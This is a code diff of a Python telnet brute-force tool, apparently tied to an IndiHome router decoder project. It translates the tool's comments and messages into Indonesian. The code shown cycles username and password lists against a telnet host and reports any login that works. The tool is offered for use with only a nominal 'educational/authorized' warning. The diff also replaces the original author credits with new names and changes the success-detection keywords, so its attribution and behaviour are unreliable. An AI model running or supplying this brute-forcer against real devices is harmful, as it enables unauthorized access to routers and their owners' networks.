@@ -1,14 +1,10 @@
-#!/usr/bin/env python
-
 # Phyton build For: https://github.com/MichaelJorky/indihome-router-decoder/
-# original (c) 2024 Dunia MR
+# Original (c) 2024 Dunia MR
 
 ### TELNET-BRUTE ###
-# Uses a set of usernames & passwords from auth.py to obtain credentials to a telnet host.
-# ade, 2024
-#
-# run without arguments to see usage
-# Made for educational/authorized use.
+# Menggunakan serangkaian nama pengguna & kata sandi dari auth.py untuk mendapatkan kredensial ke host telnet.
+# jalankan tanpa argumen untuk melihat penggunaan
+# Dibuat untuk penggunaan pendidikan/diizinkan.
 
 VER = "1.0.0"
 
@@ -26,12 +22,11 @@ LOGIN_PROMPT = b"login:"
 PWD_PROMPT = b"password:"
 
 EXPECT_TIMEOUT = 775
-# Increase this if the tool gives false negatives.
-# It might give up on waiting for response too early!
-# Increasing will make it slower though so max 2000 probably.
+# Tingkatkan ini jika alat memberikan negatif palsu.
+# Mungkin menyerah menunggu respons terlalu cepat!
+# Meningkatkan akan membuatnya lebih lambat, jadi maksimal 2000 mungkin.
 
-
-# convert string to bytes, write to telnet, return byte length back
+# konversi string menjadi byte, tulis ke telnet, kembalikan panjang byte
 def t_write(telnet, string):
 	try:
 		buf = string.encode("ascii")
@@ -73,16 +68,16 @@ class AutoTelnet:
 	def brute(self, verbose):
 		usersLen = len(USERS)
 		
-		for uIdx, user in enumerate(USERS): # loop all usernames
+		for uIdx, user in enumerate(USERS): # loop semua nama pengguna
 			self.conn()
 			
 			n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
 
 			if not self.L_prompt.decode() in str_lastline(txt).lower():
-				print(f"[err] Failed to receive expected login prompt from host.")
-				print(f"[err] Expected: \"{self.L_prompt.decode()}\"")
-				print(f"[err] Got: \"{txt.decode()}\"")
-				print(f"[err] Note: the host being slow can also cause this.")
+				print(f"[err] Gagal menerima prompt login yang diharapkan dari host.")
+				print(f"[err] Diharapkan: \"{self.L_prompt.decode()}\"")
+				print(f"[err] Dapat: \"{txt.decode()}\"")
+				print(f"[err] Catatan: host yang lambat juga dapat menyebabkan ini.")
 				sys.exit(0)
 
 			if self.L_prompt.decode() in str_lastline(txt).lower():
@@ -97,16 +92,16 @@ class AutoTelnet:
 
 						pwdsLen = len(PASSWORDS)
 
-						for pIdx, pwd in enumerate(PASSWORDS): # loop all passwords
+						for pIdx, pwd in enumerate(PASSWORDS): # loop semua kata sandi
 							self.conn()
 							
 							n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
 							
 							if not self.L_prompt.decode() in str_lastline(txt).lower():
-								print(f"[err] Failed to receive expected login prompt from host.")
-								print(f"[err] Expected: \"{self.L_prompt.decode()}\"")
-								print(f"[err] Got: \"{txt.decode()}\"")
-								print(f"[err] Note: the host being slow can also cause this.")
+								print(f"[err] Gagal menerima prompt login yang diharapkan dari host.")
+								print(f"[err] Diharapkan: \"{self.L_prompt.decode()}\"")
+								print(f"[err] Dapat: \"{txt.decode()}\"")
+								print(f"[err] Catatan: host yang lambat juga dapat menyebabkan ini.")
 								sys.exit(0)
 
 							if self.L_prompt.decode() in str_lastline(txt).lower():
@@ -117,7 +112,7 @@ class AutoTelnet:
 									
 									n, match, txt = self.telnet.expect([rb"(\w* )?password:( ?)"], EXPECT_TIMEOUT / 1000)
 									lastl = str_lastline(txt).lower()
-									if (not self.P_prompt.decode() in lastl.lower() and not "incorrect" in lastl) or "welcome" in lastl:
+									if (not self.P_prompt.decode() in lastl.lower() and not "salah" in lastl) or "selamat datang" in lastl:
 										if verbose:
 											print(f"| [V]         {pwd} ({str(pIdx + 1)}/{str(pwdsLen)})")
 
@@ -135,9 +130,9 @@ class AutoTelnet:
 								except SystemExit as e:
 									sys.exit(e)
 								except ConnectionError:
-									print(f"[err] Failed to connect to host.")
+									print(f"[err] Gagal terhubung ke host.")
 								except:
-									print("[brute] Exception occurred")
+									print("[brute] Terjadi pengecualian")
 									traceback.print_exc()
 									sys.exit(0)
 					else:
@@ -151,13 +146,13 @@ class AutoTelnet:
 				except SystemExit as e:
 					sys.exit(e)
 				except ConnectionError:
-					print(f"[err] Failed to connect to host.")
+					print(f"[err] Gagal terhubung ke host.")
 				except:
-					print("[brute] Exception occurred")
+					print("[brute] Terjadi pengecualian")
 					traceback.print_exc()
 					sys.exit(0)
 
-		# exhausted!
+		# habis!
 		self.telnet.close()
 		return False
 
@@ -165,19 +160,19 @@ class AutoTelnet:
 def main():
 	basename = os.path.splitext(os.path.basename(sys.argv[0]))[0]
 
-	usage = f"""telnet-brute v{VER}
+	penggunaan = f"""telnet-brute v{VER}
 	
-usage:	{basename} <host>
-	[-v] Display each attempt
+penggunaan:	{basename} <host>
+	[-v] Tampilkan setiap percobaan
 
-Example: {basename}.py 127.0.0.1
+Contoh: {basename}.py 127.0.0.1
 
-made by: ade (2021)
-inspiration: dtrinf (2016)
+dibuat oleh: Dunia MR (2024)
+inspirasi: xcode (2024)
 
-WARNING: Made for educational/authorized use."""
+PERINGATAN: Dibuat untuk penggunaan pendidikan/diizinkan."""
 	if len(sys.argv) <= 1:
-		print(usage)
+		print(penggunaan)
 		sys.exit(1)
 
 	opts = getopt.getopt(sys.argv[2:], "v")
@@ -198,10 +193,10 @@ WARNING: Made for educational/authorized use."""
 	result = autoTelnet.brute(verb)
 	
 	print("")
-	if result: # creds found
-		print(f"[end] Working login found!\nuser: \"{autoTelnet.correct['user']}\"\npwd: \"{autoTelnet.correct['pwd']}\"")
+	if result: # kredensial ditemukan
+		print(f"[end] Login berhasil ditemukan!\npengguna: \"{autoTelnet.correct['user']}\"\nkata sandi: \"{autoTelnet.correct['pwd']}\"")
 	else:
-		print(f"[end] No credentials found.")
+		print(f"[end] Tidak ada kredensial yang ditemukan.")
 
 	return 0
 
@@ -210,10 +205,10 @@ try:
 except KeyboardInterrupt:
 	sys.exit(0)
 except ConnectionError:
-	print(f"[err] Failed to connect to host.")
+	print(f"[err] Gagal terhubung ke host.")
 except SystemExit as e:
 	sys.exit(e)
 except Exception:
-	print(f"[exc] Exception occurred.\n")
+	print(f"[exc] Pengecualian terjadi.\n")
 	traceback.print_exc()
 	sys.exit(0)
